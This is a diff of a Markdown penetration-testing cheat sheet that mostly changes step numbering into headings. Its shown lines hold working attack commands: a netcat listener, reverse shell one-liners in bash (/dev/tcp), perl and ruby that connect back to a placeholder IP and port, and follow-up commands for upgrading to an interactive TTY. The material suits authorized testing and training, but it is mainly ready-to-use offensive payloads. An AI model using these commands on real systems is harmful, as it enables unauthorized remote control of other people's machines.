@@ -2,8 +2,6 @@
 
 ### Detect firewalls
 
-###### Incoming traffic blocking
-
 ###### Outgoing traffic blocking
 
 Listen to ICMP traffic on host:
@@ -30,11 +28,12 @@ TODO
 
 ### Reverse Shells
 
-1. Setup a listener on host
+###### Setup a listener on host
 ```
 nc -lvnp <PORT>
 ```
-2. Execute reverse shell command  
+
+###### Execute reverse shell command  
 **Bash**
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
@@ -73,7 +72,8 @@ perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-3. (Get TTY)
+###### Optional - Get TTY
+
 ```
 /bin/sh -i
 /bin/bash -i
@@ -97,7 +97,7 @@ exec "/bin/sh"
 !sh
 ```
 
-4. (Get auto-completion and commands history)
+###### Optional - Get auto-completion and commands history
   - Set host terminal to raw with echo unset:
   `*ctrl-z* stty raw -echo`
   - If TERM environment variable is not set on target shell:
